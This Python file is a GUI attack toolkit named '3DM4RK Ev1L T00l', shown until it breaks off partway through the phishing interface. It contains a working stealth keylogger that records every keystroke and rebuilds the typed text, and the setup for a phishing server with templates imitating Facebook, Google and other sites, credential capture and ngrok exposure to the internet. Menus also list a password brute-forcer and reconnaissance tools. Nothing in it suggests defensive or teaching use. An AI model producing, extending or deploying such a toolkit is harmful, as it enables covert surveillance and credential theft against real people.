import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext, simpledialog, filedialog
import socket
import requests
from datetime import datetime
import threading
import ipaddress
import subprocess
import platform
import http.server
import socketserver
import os
import json
import webbrowser
from urllib.parse import parse_qs, urlparse
import urllib.request
from bs4 import BeautifulSoup
import pynput
from pynput import keyboard
import time
import re

class EvilToolGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("3DM4RK Ev1L T00l v1.0")
        self.root.geometry("700x500")
        self.root.configure(bg='#2b2b2b')
        self.root.resizable(False, False)
        
        # Tool version
        self.version = "1.0"
        
        # Get system information
        self.computer_name = socket.gethostname()
        self.local_ip = self.get_local_ip()
        self.public_ip = self.get_public_ip()
        
        # Phishing server variables
        self.phishing_server = None
        self.server_thread = None
        self.is_server_running = False
        self.captured_credentials = []
        self.auto_save = True
        self.credentials_file = "captured_credentials.json"
        
        # Custom phishing variables
        self.custom_url_to_clone = ""
        self.custom_html_content = ""
        
        # WAN mode variables
        self.wan_mode = False
        self.ngrok_process = None
        
        # Keylogger variables
        self.keylogger_active = False
        self.keyboard_listener = None
        self.keystrokes = []
        self.keystrokes_file = "keystrokes.json"
        self.current_window = ""
        
        # Password cracker variables
        self.bruteforce_active = False
        self.bruteforce_thread = None
        self.current_password_attempt = ""
        self.attempts_count = 0
        
        # AI Detection variables
        self.detected_username_field = ""
        self.detected_password_field = ""
        self.detected_form_action = ""
        
        self.center_window(700, 500)
        self.setup_styles()
        
        self.load_credentials()
        self.show_login_screen()
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def get_public_ip(self):
        """Get public IP address"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            return "Unable to fetch public IP"
    
    def center_window(self, width, height):
        """Center the window on screen"""
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width - width) // 2
        y = (screen_height - height) // 2
        self.root.geometry(f"{width}x{height}+{x}+{y}")
    
    def setup_styles(self):
        """Configure custom styles for the application"""
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure('Evil.TLabel', 
                       background='#2b2b2b', 
                       foreground='#00ff00',
                       font=('Courier', 12))
        
        style.configure('Evil.TButton',
                       background='#1a1a1a',
                       foreground='#00ff00',
                       borderwidth=2,
                       relief='raised',
                       font=('Courier', 10, 'bold'))
        
        style.map('Evil.TButton',
                 background=[('active', '#333333'),
                           ('pressed', '#004400')],
                 foreground=[('active', '#00ff00')])
        
        style.configure('Evil.TEntry',
                       fieldbackground='#1a1a1a',
                       foreground='#00ff00',
                       insertcolor='#00ff00')
        
        style.configure('Info.TLabel',
                       background='#2b2b2b',
                       foreground='#ff9900',
                       font=('Courier', 9))
        
        style.configure('Version.TLabel',
                       background='#2b2b2b',
                       foreground='#888888',
                       font=('Courier', 8))
        
        style.configure('Scan.TFrame',
                       background='#2b2b2b')
        
        style.configure('Scan.Treeview',
                       background='#1a1a1a',
                       foreground='#00ff00',
                       fieldbackground='#1a1a1a')
        
        style.configure('Scan.Treeview.Heading',
                       background='#333333',
                       foreground='#00ff00')
        
        style.configure('Server.TLabel',
                       background='#2b2b2b',
                       foreground='#ff4444',
                       font=('Courier', 10, 'bold'))
        
        style.configure('Keylogger.TLabel',
                       background='#2b2b2b',
                       foreground='#ff0000',
                       font=('Courier', 14, 'bold'))
        
        style.configure('Bruteforce.TLabel',
                       background='#2b2b2b',
                       foreground='#ff00ff',
                       font=('Courier', 12, 'bold'))
        
        style.configure('AI.TLabel',
                       background='#2b2b2b',
                       foreground='#00ffff',
                       font=('Courier', 11, 'bold'))
        
        style.configure('WAN.TLabel',
                       background='#2b2b2b',
                       foreground='#ffff00',
                       font=('Courier', 10, 'bold'))
        
        # New enhanced styles
        style.configure('Section.TLabel', 
                       background='#2b2b2b', 
                       foreground='#00ff00',
                       font=('Courier', 12, 'bold'))
        
        style.configure('Success.TLabel', 
                       background='#2b2b2b', 
                       foreground='#00ff00')
        
        style.configure('Warning.TLabel', 
                       background='#2b2b2b', 
                       foreground='#ffff00')
        
        style.configure('Error.TLabel', 
                       background='#2b2b2b', 
                       foreground='#ff4444')
        
        style.configure('Server.Active.TLabel', 
                       background='#2b2b2b', 
                       foreground='#00ff00')
        
        style.configure('Server.Inactive.TLabel', 
                       background='#2b2b2b', 
                       foreground='#ff4444')
    
    def load_credentials(self):
        """Load credentials from JSON file"""
        try:
            if os.path.exists(self.credentials_file):
                with open(self.credentials_file, 'r') as f:
                    self.captured_credentials = json.load(f)
                print(f"Loaded {len(self.captured_credentials)} credentials from {self.credentials_file}")
        except Exception as e:
            print(f"Error loading credentials: {str(e)}")
            self.captured_credentials = []
    
    def show_login_screen(self):
        """Display the PIN entry screen"""
        self.clear_screen()
        
        main_frame = ttk.Frame(self.root, style='Evil.TLabel')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        version_label = ttk.Label(main_frame,
                                 text=f"3DM4RK Ev1L T00l v{self.version}",
                                 style='Version.TLabel')
        version_label.pack(anchor='ne')
        
        title_label = ttk.Label(main_frame, 
                               text="3DM4RK Ev1L T00l", 
                               style='Evil.TLabel',
                               font=('Courier', 20, 'bold'))
        title_label.pack(pady=(10, 10))
        
        info_frame = ttk.Frame(main_frame, style='Evil.TLabel')
        info_frame.pack(pady=10)
        
        computer_label = ttk.Label(info_frame,
                                  text=f"Computer: {self.computer_name}",
                                  style='Info.TLabel')
        computer_label.grid(row=0, column=0, padx=10, pady=2)
        
        local_ip_label = ttk.Label(info_frame,
                                  text=f"Local IP: {self.local_ip}",
                                  style='Info.TLabel')
        local_ip_label.grid(row=0, column=1, padx=10, pady=2)
        
        public_ip_label = ttk.Label(info_frame,
                                   text=f"Public IP: {self.public_ip}",
                                   style='Info.TLabel')
        public_ip_label.grid(row=1, column=0, columnspan=2, pady=2)
        
        warning_label = ttk.Label(main_frame,
                                 text="⚠️ AUTHORIZED PERSONNEL ONLY ⚠️",
                                 style='Evil.TLabel',
                                 font=('Courier', 12, 'bold'))
        warning_label.pack(pady=(10, 20))
        
        pin_frame = ttk.Frame(main_frame, style='Evil.TLabel')
        pin_frame.pack(pady=20)
        
        pin_label = ttk.Label(pin_frame, 
                             text="ENTER ACCESS PIN:", 
                             style='Evil.TLabel')
        pin_label.grid(row=0, column=0, padx=(0, 10))
        
        self.pin_entry = ttk.Entry(pin_frame, 
                                  show="•", 
                                  width=20, 
                                  style='Evil.TEntry',
                                  font=('Courier', 12))
        self.pin_entry.grid(row=0, column=1)
        self.pin_entry.bind('<Return>', self.verify_pin)
        
        login_btn = ttk.Button(main_frame,
                              text="ACCESS SYSTEM",
                              command=self.verify_pin,
                              style='Evil.TButton')
        login_btn.pack(pady=20)
        
        self.pin_entry.focus()
    
    def verify_pin(self, event=None):
        """Verify the entered PIN"""
        entered_pin = self.pin_entry.get()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if entered_pin == "666666":
            self.log_access_attempt(current_time, "SUCCESS")
            self.show_main_menu()
        else:
            self.log_access_attempt(current_time, "FAILED")
            messagebox.showerror("ACCESS DENIED", 
                                f"Invalid PIN!\n\nSystem Information Logged:\n"
                                f"Computer: {self.computer_name}\n"
                                f"Local IP: {self.local_ip}\n"
                                f"Public IP: {self.public_ip}\n"
                                f"Time: {current_time}\n\n"
                                f"System will terminate.")
            self.root.after(1000, self.root.quit)
    
    def log_access_attempt(self, timestamp, status):
        """Log access attempts with system information"""
        log_entry = f"""
=== ACCESS ATTEMPT ===
Timestamp: {timestamp}
Status: {status}
Computer Name: {self.computer_name}
Local IP: {self.local_ip}
Public IP: {self.public_ip}
PIN Attempt: {self.pin_entry.get()}
=====================
"""
        print(log_entry)
        try:
            with open("access_log.txt", "a") as log_file:
                log_file.write(log_entry)
        except:
            pass
    
    def show_main_menu(self):
        """Enhanced main menu with better organization"""
        self.clear_screen()
        
        main_frame = ttk.Frame(self.root, style='Evil.TLabel')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        # Header Section
        header_frame = ttk.Frame(main_frame, style='Evil.TLabel')
        header_frame.pack(fill='x', pady=(0, 20))
        
        title_label = ttk.Label(header_frame, 
                              text="3DM4RK Ev1L T00l - MAIN MENU", 
                              style='Evil.TLabel',
                              font=('Courier', 18, 'bold'))
        title_label.pack(side='left')
        
        version_label = ttk.Label(header_frame,
                                text=f"v{self.version}",
                                style='Version.TLabel')
        version_label.pack(side='right')
        
        # Status Section with border
        status_frame = ttk.LabelFrame(main_frame, 
                                    text=" SYSTEM STATUS ",
                                    style='Evil.TLabel',
                                    padding=10)
        status_frame.pack(fill='x', pady=(0, 20))
        
        info_grid = ttk.Frame(status_frame, style='Evil.TLabel')
        info_grid.pack(fill='x')
        
        ttk.Label(info_grid, text=f"Computer:", style='Info.TLabel').grid(row=0, column=0, sticky='w')
        ttk.Label(info_grid, text=self.computer_name, style='Evil.TLabel').grid(row=0, column=1, sticky='w', padx=(10, 20))
        
        ttk.Label(info_grid, text=f"Local IP:", style='Info.TLabel').grid(row=0, column=2, sticky='w')
        ttk.Label(info_grid, text=self.local_ip, style='Evil.TLabel').grid(row=0, column=3, sticky='w', padx=(10, 0))
        
        ttk.Label(info_grid, text=f"Keylogger:", style='Info.TLabel').grid(row=1, column=0, sticky='w', pady=(5, 0))
        status_text = "ACTIVE" if self.keylogger_active else "INACTIVE"
        status_style = 'Keylogger.TLabel' if self.keylogger_active else 'Info.TLabel'
        ttk.Label(info_grid, text=status_text, style=status_style).grid(row=1, column=1, sticky='w', padx=(10, 20), pady=(5, 0))
        
        ttk.Label(info_grid, text=f"Credentials:", style='Info.TLabel').grid(row=1, column=2, sticky='w', pady=(5, 0))
        ttk.Label(info_grid, text=str(len(self.captured_credentials)), style='Evil.TLabel').grid(row=1, column=3, sticky='w', padx=(10, 0), pady=(5, 0))
        
        # Tools Grid with better organization
        tools_frame = ttk.LabelFrame(main_frame, 
                                   text=" AVAILABLE TOOLS ",
                                   style='Evil.TLabel',
                                   padding=15)
        tools_frame.pack(expand=True, fill='both')
        
        tools = [
            ("🔑 KEYLOGGER", "Stealth keylogging", self.keylogger_tool),
            ("🎣 PHISHING", "Credential harvesting", self.phishing_tool),
            ("🌐 NETWORK SCANNER", "Host discovery", self.network_scanner),
            ("🔓 PASSWORD CRACKER", "Brute force attacks", self.password_cracker),
            ("💻 SYSTEM INFO", "System reconnaissance", self.show_system_info),
            ("🚪 EXIT", "Close application", self.exit_tool)
        ]
        
        for i, (name, desc, command) in enumerate(tools):
            tool_frame = ttk.Frame(tools_frame, style='Evil.TLabel')
            tool_frame.grid(row=i//2, column=i%2, padx=10, pady=8, sticky='nsew')
            
            btn = ttk.Button(tool_frame,
                           text=name,
                           command=command,
                           style='Evil.TButton',
                           width=20)
            btn.pack(fill='x')
            
            desc_label = ttk.Label(tool_frame,
                                 text=desc,
                                 style='Info.TLabel',
                                 font=('Courier', 8))
            desc_label.pack(pady=(2, 0))
        
        # Configure grid weights for responsive layout
        tools_frame.columnconfigure(0, weight=1)
        tools_frame.columnconfigure(1, weight=1)
    
    def show_system_info(self):
        """Show detailed system information"""
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        keylogger_status = "ACTIVE" if self.keylogger_active else "INACTIVE"
        keystrokes_count = len(self.keystrokes)
        bruteforce_status = "ACTIVE" if self.bruteforce_active else "INACTIVE"
        
        system_info = f"""
SYSTEM INFORMATION:
-------------------
Tool Version: {self.version}
Computer Name: {self.computer_name}
Local IP Address: {self.local_ip}
Public IP Address: {self.public_ip}
Current Time: {current_time}

KEYLOGGER STATUS:
-----------------
Status: {keylogger_status}
Keystrokes Captured: {keystrokes_count}
Save File: {self.keystrokes_file}

BRUTEFORCE STATUS:
------------------
Status: {bruteforce_status}
Attempts: {self.attempts_count}

AI DETECTION:
-------------
Last Detection: {self.detected_username_field if self.detected_username_field else 'Not performed'}

CAPTURED CREDENTIALS:
---------------------
Total Captured: {len(self.captured_credentials)}
Auto-save: {'ENABLED' if self.auto_save else 'DISABLED'}
Save File: {self.credentials_file}

CUSTOM PHISHING:
----------------
Custom URL: {self.custom_url_to_clone if self.custom_url_to_clone else 'Not set'}

WAN MODE:
---------
Status: {'ENABLED' if self.wan_mode else 'DISABLED'}
Ngrok: {'Ready' if os.path.exists('ngrok.exe') else 'Not Found'}

NETWORK INTERFACES:
-------------------
"""
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            system_info += f"Hostname: {hostname}\n"
            system_info += f"Local Host IP: {local_ip}\n"
        except:
            system_info += "Unable to fetch additional network info\n"
        
        self.show_tool_window("System Information", system_info)

    # KEYLOGGER FUNCTIONALITY
    def keylogger_tool(self):
        """Keylogger tool with stealth mode"""
        self.show_keylogger_window()
    
    def show_keylogger_window(self):
        """Enhanced keylogger interface"""
        keylogger_window = tk.Toplevel(self.root)
        keylogger_window.title(f"3DM4RK - Keylogger v{self.version}")
        keylogger_window.geometry("650x550")
        keylogger_window.configure(bg='#2b2b2b')
        keylogger_window.resizable(True, True)
        
        self.center_child_window(keylogger_window, 650, 550)
        
        # Create notebook for tabs
        notebook = ttk.Notebook(keylogger_window)
        notebook.pack(expand=True, fill='both', padx=10, pady=10)
        
        # Control Tab
        control_frame = ttk.Frame(notebook, style='Scan.TFrame')
        notebook.add(control_frame, text="🎮 Control")
        
        # Keystrokes Tab
        data_frame = ttk.Frame(notebook, style='Scan.TFrame')
        notebook.add(data_frame, text="⌨️ Keystrokes")
        
        self.setup_keylogger_control_tab(control_frame)
        self.setup_keylogger_data_tab(data_frame)
    
    def setup_keylogger_control_tab(self, parent):
        """Setup keylogger control tab"""
        main_frame = ttk.Frame(parent, style='Scan.TFrame')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        title_label = ttk.Label(main_frame,
                              text="KEYLOGGER CONTROL",
                              style='Section.TLabel')
        title_label.pack(pady=(0, 20))
        
        # Status Section
        status_frame = ttk.LabelFrame(main_frame, 
                                    text=" Status ",
                                    style='Evil.TLabel',
                                    padding=10)
        status_frame.pack(fill='x', pady=10)
        
        self.keylogger_status_label = ttk.Label(status_frame,
                                              text="KEYLOGGER STATUS: INACTIVE",
                                              style='Keylogger.TLabel')
        self.keylogger_status_label.pack(pady=5)
        
        self.keystrokes_count_label = ttk.Label(status_frame,
                                               text=f"Keystrokes Captured: {len(self.keystrokes)}",
                                               style='Info.TLabel')
        self.keystrokes_count_label.pack(pady=2)
        
        # Controls Section
        controls_frame = ttk.LabelFrame(main_frame, 
                                      text=" Controls ",
                                      style='Evil.TLabel',
                                      padding=10)
        controls_frame.pack(fill='x', pady=10)
        
        controls_grid = ttk.Frame(controls_frame, style='Scan.TFrame')
        controls_grid.pack(fill='x')
        
        self.start_keylogger_btn = ttk.Button(controls_grid,
                                            text="START KEYLOGGER",
                                            command=self.start_keylogger,
                                            style='Evil.TButton')
        self.start_keylogger_btn.grid(row=0, column=0, padx=(0, 10), pady=5)
        
        self.stop_keylogger_btn = ttk.Button(controls_grid,
                                           text="STOP KEYLOGGER",
                                           command=self.stop_keylogger,
                                           style='Evil.TButton',
                                           state='disabled')
        self.stop_keylogger_btn.grid(row=0, column=1, padx=(0, 10), pady=5)
        
        save_btn = ttk.Button(controls_grid,
                            text="SAVE KEYSTROKES",
                            command=self.save_keystrokes,
                            style='Evil.TButton')
        save_btn.grid(row=0, column=2, padx=(0, 10), pady=5)
        
        convert_btn = ttk.Button(controls_grid,
                               text="CONVERT TO READABLE",
                               command=self.convert_keystrokes,
                               style='Evil.TButton')
        convert_btn.grid(row=1, column=0, padx=(0, 10), pady=5)
        
        clear_btn = ttk.Button(controls_grid,
                             text="CLEAR KEYSTROKES",
                             command=self.clear_keystrokes,
                             style='Evil.TButton')
        clear_btn.grid(row=1, column=1, padx=(0, 10), pady=5)
        
        # Settings Section
        settings_frame = ttk.LabelFrame(main_frame, 
                                      text=" Settings ",
                                      style='Evil.TLabel',
                                      padding=10)
        settings_frame.pack(fill='x', pady=10)
        
        self.keylogger_auto_save = tk.BooleanVar(value=True)
        auto_save_cb = ttk.Checkbutton(settings_frame,
                                      text="Auto-save keystrokes",
                                      variable=self.keylogger_auto_save,
                                      style='Evil.TLabel')
        auto_save_cb.pack(anchor='w', pady=5)
        
        close_btn = ttk.Button(main_frame,
                             text="CLOSE",
                             command=lambda: parent.winfo_toplevel().destroy(),
                             style='Evil.TButton')
        close_btn.pack(pady=10)
    
    def setup_keylogger_data_tab(self, parent):
        """Setup keylogger data tab"""
        main_frame = ttk.Frame(parent, style='Scan.TFrame')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        keystrokes_label = ttk.Label(main_frame,
                                    text="CAPTURED KEYSTROKES:",
                                    style='Section.TLabel')
        keystrokes_label.pack(pady=(0, 10))
        
        self.keystrokes_text = scrolledtext.ScrolledText(main_frame,
                                                        height=25,
                                                        bg='#1a1a1a',
                                                        fg='#ff4444',
                                                        font=('Courier', 9))
        self.keystrokes_text.pack(fill='both', expand=True, pady=5)
        
        self.refresh_keystrokes_display()
    
    def start_keylogger(self):
        """Start the keylogger in stealth mode"""
        try:
            stealth_window = tk.Toplevel(self.root)
            stealth_window.title("Keylogger Status")
            stealth_window.geometry("300x150")
            stealth_window.configure(bg='#2b2b2b')
            stealth_window.resizable(False, False)
            
            self.center_child_window(stealth_window, 300, 150)
            
            stealth_label = ttk.Label(stealth_window,
                                    text="STEALTH MODE ACTIVATED",
                                    style='Keylogger.TLabel')
            stealth_label.pack(pady=20)
            
            info_label = ttk.Label(stealth_window,
                                  text="Keylogger is running in background\nAll keystrokes are being recorded",
                                  style='Info.TLabel')
            info_label.pack(pady=10)
            
            stop_btn = ttk.Button(stealth_window,
                                text="STOP KEYLOGGER",
                                command=self.stop_keylogger,
                                style='Evil.TButton')
            stop_btn.pack(pady=10)
            
            self.keylogger_active = True
            self.keyboard_listener = keyboard.Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release
            )
            self.keyboard_listener.start()
            
            self.keylogger_status_label.config(text="KEYLOGGER STATUS: ACTIVE (STEALTH MODE)")
            self.start_keylogger_btn.config(state='disabled')
            self.stop_keylogger_btn.config(state='normal')
            
            stealth_window.after(3000, stealth_window.destroy)
            
            messagebox.showinfo("Keylogger Started", "Keylogger activated in stealth mode!\nAll keystrokes are now being recorded.")
            
        except Exception as e:
            messagebox.showerror("Keylogger Error", f"Failed to start keylogger:\n{str(e)}")
    
    def stop_keylogger(self):
        """Stop the keylogger"""
        if self.keylogger_active and self.keyboard_listener:
            self.keylogger_active = False
            self.keyboard_listener.stop()
            
            self.keylogger_status_label.config(text="KEYLOGGER STATUS: INACTIVE")
            self.start_keylogger_btn.config(state='normal')
            self.stop_keylogger_btn.config(state='disabled')
            
            if self.keylogger_auto_save.get() and self.keystrokes:
                self.save_keystrokes()
            
            messagebox.showinfo("Keylogger Stopped", "Keylogger has been stopped.")
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            
            key_str = self.get_key_string(key)
            
            keystroke_record = {
                'timestamp': timestamp,
                'key': key_str,
                'action': 'press',
                'window': self.get_active_window()
            }
            
            self.keystrokes.append(keystroke_record)
            
            self.root.after(0, self.update_keystrokes_display)
            
        except Exception as e:
            print(f"Key press error: {e}")
    
    def on_key_release(self, key):
        """Handle key release events"""
        try:
            pass
        except Exception as e:
            print(f"Key release error: {e}")
    
    def get_key_string(self, key):
        """Convert key object to readable string"""
        try:
            if hasattr(key, 'char') and key.char:
                return key.char
            elif key == keyboard.Key.space:
                return ' '
            elif key == keyboard.Key.enter:
                return '[ENTER]'
            elif key == keyboard.Key.tab:
                return '[TAB]'
            elif key == keyboard.Key.backspace:
                return '[BACKSPACE]'
            elif key == keyboard.Key.delete:
                return '[DELETE]'
            elif key == keyboard.Key.esc:
                return '[ESC]'
            elif key == keyboard.Key.shift:
                return '[SHIFT]'
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                return '[CTRL]'
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                return '[ALT]'
            else:
                return str(key).replace('Key.', '')
        except:
            return str(key)
    
    def get_active_window(self):
        """Get the currently active window title"""
        try:
            return "Unknown Window"
        except:
            return "Unknown Window"
    
    def update_keystrokes_display(self):
        """Update the keystrokes display"""
        self.keystrokes_count_label.config(text=f"Keystrokes Captured: {len(self.keystrokes)}")
        self.refresh_keystrokes_display()
    
    def refresh_keystrokes_display(self):
        """Refresh the keystrokes display"""
        self.keystrokes_text.delete('1.0', 'end')
        
        if not self.keystrokes:
            self.keystrokes_text.insert('end', "No keystrokes captured yet...")
            return
        
        for i, stroke in enumerate(self.keystrokes[-100:], 1):
            self.keystrokes_text.insert('end', f"{i:3d}. [{stroke['timestamp']}] {stroke['key']}\n")
        
        self.keystrokes_text.see('end')
    
    def save_keystrokes(self):
        """Save keystrokes to JSON file"""
        try:
            with open(self.keystrokes_file, 'w') as f:
                json.dump(self.keystrokes, f, indent=2)
            messagebox.showinfo("Success", f"Keystrokes saved to {self.keystrokes_file}")
        except Exception as e:
            messagebox.showerror("Save Error", f"Failed to save keystrokes: {str(e)}")
    
    def convert_keystrokes(self):
        """Convert JSON keystrokes to readable format"""
        try:
            input_file = filedialog.askopenfilename(
                title="Select Keystrokes JSON File",
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
            )
            
            if not input_file:
                return
            
            with open(input_file, 'r') as f:
                keystrokes_data = json.load(f)
            
            output_file = filedialog.asksaveasfilename(
                title="Save Readable Keystrokes As",
                defaultextension=".txt",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            
            if not output_file:
                return
            
            with open(output_file, 'w') as f:
                f.write("3DM4RK Ev1L T00l - Keystrokes Log\n")
                f.write("=" * 50 + "\n")
                f.write(f"Conversion Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Keystrokes: {len(keystrokes_data)}\n")
                f.write("=" * 50 + "\n\n")
                
                current_text = ""
                for i, stroke in enumerate(keystrokes_data, 1):
                    key = stroke.get('key', '')
                    
                    if key == '[ENTER]':
                        current_text += '\n'
                        f.write(f"[{stroke['timestamp']}] ENTER\n")
                        f.write(f"Text so far: {current_text}\n")
                        f.write("-" * 40 + "\n")
                        current_text = ""
                    elif key == '[BACKSPACE]':
                        current_text = current_text[:-1]
                    elif key == '[TAB]':
                        current_text += '\t'
                    elif key in ['[SHIFT]', '[CTRL]', '[ALT]', '[ESC]']:
                        pass
                    else:
                        current_text += key
                    
                    f.write(f"{i:4d}. [{stroke['timestamp']}] {key}\n")
                
                f.write("\n" + "=" * 50 + "\n")
                f.write("RECONSTRUCTED TEXT:\n")
                f.write("=" * 50 + "\n")
                f.write(current_text + "\n")
            
            messagebox.showinfo("Conversion Complete", f"Keystrokes converted to readable format:\n{output_file}")
            
        except Exception as e:
            messagebox.showerror("Conversion Error", f"Failed to convert keystrokes: {str(e)}")
    
    def clear_keystrokes(self):
        """Clear captured keystrokes"""
        if messagebox.askyesno("Confirm Clear", "Are you sure you want to clear all captured keystrokes?"):
            self.keystrokes.clear()
            self.keystrokes_count_label.config(text="Keystrokes Captured: 0")
            self.refresh_keystrokes_display()

    # PHISHING FUNCTIONALITY
    def phishing_tool(self):
        """Phishing tool with HTTP server and ngrok integration"""
        self.show_phishing_server_window()
    
    def show_phishing_server_window(self):
        """Enhanced phishing server interface with tabs"""
        server_window = tk.Toplevel(self.root)
        server_window.title(f"3DM4RK - Phishing Server v{self.version}")
        server_window.geometry("900x750")
        server_window.configure(bg='#2b2b2b')
        server_window.resizable(True, True)
        
        self.center_child_window(server_window, 900, 750)
        
        # Create notebook for tabs
        notebook = ttk.Notebook(server_window)
        notebook.pack(expand=True, fill='both', padx=10, pady=10)
        
        # Server Control Tab
        control_frame = ttk.Frame(notebook, style='Scan.TFrame')
        notebook.add(control_frame, text="🚀 Server Control")
        
        # WAN Configuration Tab
        wan_frame = ttk.Frame(notebook, style='Scan.TFrame')
        notebook.add(wan_frame, text="🌐 WAN Configuration")
        
        # Credentials Tab
        creds_frame = ttk.Frame(notebook, style='Scan.TFrame')
        notebook.add(creds_frame, text="🔑 Captured Credentials")
        
        self.setup_phishing_control_tab(control_frame)
        self.setup_wan_tab(wan_frame)
        self.setup_credentials_tab(creds_frame)
    
    def setup_phishing_control_tab(self, parent):
        """Setup phishing server control tab"""
        main_frame = ttk.Frame(parent, style='Scan.TFrame')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        title_label = ttk.Label(main_frame,
                              text="PHISHING SERVER CONTROL",
                              style='Section.TLabel')
        title_label.pack(pady=(0, 20))
        
        # Server Configuration Section
        config_frame = ttk.LabelFrame(main_frame, 
                                    text=" Server Configuration ",
                                    style='Evil.TLabel',
                                    padding=10)
        config_frame.pack(fill='x', pady=(0, 10))
        
        settings_grid = ttk.Frame(config_frame, style='Evil.TLabel')
        settings_grid.pack(fill='x')
        
        ttk.Label(settings_grid, text="Port:", style='Evil.TLabel').grid(row=0, column=0, sticky='w', padx=(0, 10))
        self.port_var = tk.StringVar(value="8080")
        port_entry = ttk.Entry(settings_grid, textvariable=self.port_var, width=10, style='Evil.TEntry')
        port_entry.grid(row=0, column=1, sticky='w', padx=(0, 20))
        
        ttk.Label(settings_grid, text="Template:", style='Evil.TLabel').grid(row=0, column=2, sticky='w', padx=(0, 10))
        self.template_var = tk.StringVar(value="facebook")
        template_combo = ttk.Combobox(settings_grid, textvariable=self.template_var,
                                    values=["facebook", "google", "twitter", "instagram", "linkedin", "custom"],
                                    state="readonly", width=12)
        template_combo.grid(row=0, column=3, sticky='w')
        template_combo.bind('<<ComboboxSelected>>', self.on_template_selected)
        
        # Custom URL Section
        custom_url_frame = ttk.Frame(config_frame, style='Scan.TFrame')
        custom_url_frame.pack(fill='x', pady=5)
        
        ttk.Label(custom_url_frame, text="Custom Redirect URL:", style='Evil.TLabel').pack(side='left', padx=(0, 10))
        self.custom_url_var = tk.StringVar(value="https://www.facebook.com")
        custom_url_entry = ttk.Entry(custom_url_frame, textvariable=self.custom_url_var, width=40, style='Evil.TEntry')
        custom_url_entry.pack(side='left', padx=(0, 10))
        
        self.custom_clone_label = ttk.Label(custom_url_frame, text="Custom URL to clone: Not set", style='Info.TLabel')
        self.custom_clone_label.pack(side='left', padx=(10, 0))
        
        set_clone_btn = ttk.Button(config_frame, text="SET CLONE URL", command=self.set_custom_clone_url, style='Evil.TButton')
        set_clone_btn.pack(anchor='w', pady=5)
        
        # Control Buttons Section
        button_frame = ttk.LabelFrame(main_frame, 
                                    text=" Server Controls ",
                                    style='Evil.TLabel',
                                    padding=10)
        button_frame.pack(fill='x', pady=10)
        
        controls_grid = ttk.Frame(button_frame, style='Evil.TLabel')
        controls_grid.pack(fill='x')
        
        self.start_btn = ttk.Button(controls_grid, text="START SERVER", command=self.start_phishing_server, style='Evil.TButton')
        self.start_btn.grid(row=0, column=0, padx=(0, 10), pady=5)
        
        self.stop_btn = ttk.Button(controls_grid, text="STOP SERVER", command=self.stop_phishing_server, style='Evil.TButton', state='disabled')
        self.stop_btn.grid(row=0, column=1, padx=(0, 10), pady=5)
        
        self.auto_save_var = tk.BooleanVar(value=True)
        auto_save_cb = ttk.Checkbutton(controls_grid, text="Auto-save credentials", variable=self.auto_save_var, style='Evil.TLabel')
        auto_save_cb.grid(row=0, column=2, padx=(20, 0), pady=5)
        
        self.server_status = ttk.Label(button_frame, text="Server Status: STOPPED", style='Server.TLabel')
        self.server_status.pack(pady=5)
        
        # URL Display Section
        urls_frame = ttk.LabelFrame(main_frame, 
                                  text=" Server URLs ",
                                  style='Evil.TLabel',
                                  padding=10)
        urls_frame.pack(fill='x', pady=10)
        
        # Local URL
        local_frame = ttk.Frame(urls_frame, style='Scan.TFrame')
        local_frame.pack(fill='x', pady=2)
        ttk.Label(local_frame, text="Local URL:", style='Evil.TLabel').pack(side='left')
        self.local_url_text = tk.Text(local_frame, height=1, width=60, bg='#1a1a1a', fg='#00ff00', font=('Courier', 9))
        self.local_url_text.pack(side='left', padx=(10, 0))
        self.local_url_text.insert('1.0', f"http://localhost:8080")
        self.local_url_text.config(state='disabled')
        
        # Network URL
        network_frame = ttk.Frame(urls_frame, style='Scan.TFrame')
        network_frame.pack(fill='x', pady=2)
        ttk.Label(network_frame, text="Network URL:", style='Evil.TLabel').pack(side='left')
        self.network_url_text = tk.Text(network_frame, height=1, width=60, bg='#1a1a1a', fg='#00ff00', font=('Courier', 9))
        self.network_url_text.pack(side='left', padx=(10, 0))
        self.network_url_text.insert('1.0', f"http://{self.local_ip}:8080")
        self.network_url_text.config(state='disabled')
        
        # WAN URL
        wan_url_frame = ttk.Frame(urls_frame, style='Scan.TFrame')
        wan_url_frame.pack(fill='x', pady=2)
        ttk.Label(wan_url_frame, text="WAN URL (Ngrok):", style='WAN.TLabel').pack(side='left')
        self.wan_url_text = tk.Text(wan_url_frame, height=1, width=60, bg='#1a1a1a', fg='#ffff00', font=('Courier', 9))
        self.wan_url_text.pack(side='left', padx=(10, 0))
        self.wan_url_text.insert('1.0', "WAN mode disabled - Start server with WAN mode enabled")
        self.wan_url_text.config(state='disabled')
        
        # URL Actions
        url_actions_frame = ttk.Frame(urls_frame, style='Scan.TFrame')
        url_actions_frame.pack(fill='x', pady=5)
        copy_wan_url_btn = ttk.Button(url_actions_frame, text="COPY WAN URL", command=self.copy_wan_url, style='Evil.TButton')
